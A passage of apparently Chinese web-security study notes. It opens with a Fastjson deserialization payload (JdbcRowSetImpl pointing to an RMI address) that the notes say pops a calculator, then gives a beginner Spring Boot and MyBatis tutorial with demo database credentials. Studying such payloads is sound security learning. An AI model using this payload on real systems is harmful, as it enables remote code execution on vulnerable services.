<code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/0junlw&quot;,&quot;autoCommit&quot;:true}</code></p>
<p>弹出计算机</p>
<h1 id="38-springboot框架">38-SpringBoot框架<a hidden class="anchor" aria-hidden="true" href="#38-springboot框架">#</a></h1>
<p><a href="https://springdoc.cn/spring-boot/">https://springdoc.cn/spring-boot/</a></p>
<h2 id="web应用-路由响应">web应用-路由响应<a hidden class="anchor" aria-hidden="true" href="#web应用-路由响应">#</a></h2>
<p>1、路由映射</p>
<div class="code-block-container" id="code-1769750397401780400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397401780400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397401780400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397401780400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397401780400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">@RequestMapping
</span></span><span class="line"><span class="cl">@GetMapping</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>2、参数传递</p>
<div class="code-block-container" id="code-1769750397401780400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397401780400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397401780400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397401780400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397401780400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">@RequestParam</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>3、数据响应</p>
<div class="code-block-container" id="code-1769750397402284200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397402284200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397402284200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397402284200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397402284200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">@RestController //相当于@ResponseBody+@Controller
</span></span><span class="line"><span class="cl">@Controller</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>代码实践：</p>
<div class="code-block-container" id="code-1769750397402284200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397402284200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397402284200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397402284200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397402284200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">package com.example.springboottest;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import org.springframework.stereotype.Controller;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.RequestMapping;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.RequestMethod;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.RequestParam;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.RestController;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@RestController
</span></span><span class="line"><span class="cl">@Controller
</span></span><span class="line"><span class="cl">public class IndexController {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    //指定GET请求访问路由
</span></span><span class="line"><span class="cl">    @RequestMapping(value = &#34;/xiaodiget&#34;, method = RequestMethod.GET)
</span></span><span class="line"><span class="cl">    public String getindex() {
</span></span><span class="line"><span class="cl">        return &#34;get test&#34;;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    //指定POST请求访问路由
</span></span><span class="line"><span class="cl">    @RequestMapping(value = &#34;/xiaodipost&#34;, method = RequestMethod.POST)
</span></span><span class="line"><span class="cl">    public String getpost() {
</span></span><span class="line"><span class="cl">        return &#34;post test &#34;;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    //指定GET请求访问路由 带参数名name
</span></span><span class="line"><span class="cl">    @RequestMapping(value = &#34;/xiaodiget_g&#34;, method = RequestMethod.GET)
</span></span><span class="line"><span class="cl">    // @GetMapping(value = &#34;/xiaodiget&#34;)
</span></span><span class="line"><span class="cl">    public String get_g(@RequestParam String name) {
</span></span><span class="line"><span class="cl">        return &#34;get test&#34; + name;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    //指定POST请求访问路由 带参数名name
</span></span><span class="line"><span class="cl">    @RequestMapping(value = &#34;/xiaodipost_p&#34;, method = RequestMethod.POST)
</span></span><span class="line"><span class="cl">    // @GetMapping(value = &#34;/xiaodiget_g&#34;)
</span></span><span class="line"><span class="cl">    public String get_p(@RequestParam String name) {
</span></span><span class="line"><span class="cl">        return &#34;post test &#34; + name;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300908679.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902690.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900108.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900957.png" style="max-width: 100%; height: auto;"></p>
<h2 id="数据库应用-mybatis">数据库应用-Mybatis<a hidden class="anchor" aria-hidden="true" href="#数据库应用-mybatis">#</a></h2>
<p><a href="https://blog.csdn.net/xiaozhezhe0470/article/details/105420763">JDBC、Hibernate和Mybatis的区别</a></p>
<h3 id="配置环境">配置环境：<a hidden class="anchor" aria-hidden="true" href="#配置环境">#</a></h3>
<p>依赖项：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300908393.png" style="max-width: 100%; height: auto;"></p>
<h4 id="1数据库创建">1、数据库创建<a hidden class="anchor" aria-hidden="true" href="#1数据库创建">#</a></h4>
<p><img decoding="async" loading="lazy" src="c:/Users/SZZY/AppData/Roaming/Typora/typora-user-images/image-20250616155711895.png" style="max-width: 100%; height: auto;"></p>
<h4 id="2项目添加mybatis数据库驱动">2、项目添加Mybatis&amp;数据库驱动<a hidden class="anchor" aria-hidden="true" href="#2项目添加mybatis数据库驱动">#</a></h4>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901610.png" style="max-width: 100%; height: auto;"></p>
<h4 id="3项目配置数据库连接信息">3、项目配置数据库连接信息<a hidden class="anchor" aria-hidden="true" href="#3项目配置数据库连接信息">#</a></h4>
<div class="code-block-container" id="code-1769750397403738700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397403738700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">yaml</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397403738700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397403738700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397403738700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="c"># src/main/resources/application.yml</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="nt">spring</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">datasource</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l">jdbc:mysql://localhost:3306/demo01</span><span class="w"> </span><span class="c">#注意‘url:’后加空格，下面也是</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="l">root</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">password</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;123456&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">driver-class-name</span><span class="p">:</span><span class="w"> </span><span class="l">com.mysql.cj.jdbc.Driver</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">       
</span></span></span><span class="line"><span class="cl"><span class="c"># 我用上面的报错了，所以询问ai重写了一个</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="nt">spring</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">datasource</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l">jdbc:mysql://localhost:3306/demo01?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=UTF-8</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="l">root</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">password</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;123456&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">driver-class-name</span><span class="p">:</span><span class="w"> </span><span class="l">com.mysql.cj.jdbc.Driver</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">hikari</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">connection-timeout</span><span class="p">:</span><span class="w"> </span><span class="m">30000</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">maximum-pool-size</span><span class="p">:</span><span class="w"> </span><span class="m">20</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="nt">server</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="m">8081</span><span class="w">  </span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859599.png" style="max-width: 100%; height: auto;"></p>
<h4 id="4创建user类用来操作数据库数据">4、创建User类用来操作数据库数据<a hidden class="anchor" aria-hidden="true" href="#4创建user类用来操作数据库数据">#</a></h4>
<div class="code-block-container" id="code-1769750397405922400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397405922400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397405922400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397405922400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397405922400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">//	src/main/java/com/example/springbootmybatis/entity/User.java
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">package com.example.springbootmybatis.entity;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">public class User {
</span></span><span class="line"><span class="cl">    private Integer id;
</span></span><span class="line"><span class="cl">    private String username;
</span></span><span class="line"><span class="cl">    private String password;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    public Integer getId() {
</span></span><span class="line"><span class="cl">        return id;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    public void setId(Integer id) {
</span></span><span class="line"><span class="cl">        this.id = id;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    public String getUsername() {
</span></span><span class="line"><span class="cl">        return username;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    public void setUsername(String username) {
</span></span><span class="line"><span class="cl">        this.username = username;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    public String getPassword() {
</span></span><span class="line"><span class="cl">        return password;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    public void setPassword(String password) {
</span></span><span class="line"><span class="cl">        this.password = password;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @Override
</span></span><span class="line"><span class="cl">    public String toString() {
</span></span><span class="line"><span class="cl">        return &#34;User{&#34; +
</span></span><span class="line"><span class="cl">                &#34;id=&#34; + id +
</span></span><span class="line"><span class="cl">                &#34;, username=&#39;&#34; + username + &#39;\&#39;&#39; +
</span></span><span class="line"><span class="cl">                &#34;, password=&#39;&#34; + password + &#39;\&#39;&#39; +
</span></span><span class="line"><span class="cl">                &#39;}&#39;;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="5创建mapper动态接口代理类实现">5、创建Mapper动态接口代理类实现<a hidden class="anchor" aria-hidden="true" href="#5创建mapper动态接口代理类实现">#</a></h4>
<div class="code-block-container" id="code-1769750397409131000" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397409131000">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397409131000" title="Toggle" aria-expanded="false" aria-controls="code-1769750397409131000" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397409131000-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">// src/main/java/com/example/springbootmybatis/mapper/UserMapper.java
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">package com.example.springbootmybatis.mapper;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import com.example.springbootmybatis.entity.User;
</span></span><span class="line"><span class="cl">import org.apache.ibatis.annotations.Mapper;
</span></span><span class="line"><span class="cl">import org.apache.ibatis.annotations.Select;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import java.util.List;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@Mapper
</span></span><span class="line"><span class="cl">public interface UserMapper {
</span></span><span class="line"><span class="cl">    @Select(&#34;select * from admin&#34;)
</span></span><span class="line"><span class="cl">    public List&lt;User&gt; findAll();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @Select(&#34;select * from admin where id=1&#34;)
</span></span><span class="line"><span class="cl">    public List&lt;User&gt; findID();
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="6创建controller实现web访问调用">6、创建Controller实现Web访问调用<a hidden class="anchor" aria-hidden="true" href="#6创建controller实现web访问调用">#</a></h4>
<div class="code-block-container" id="code-1769750397409684200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397409684200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
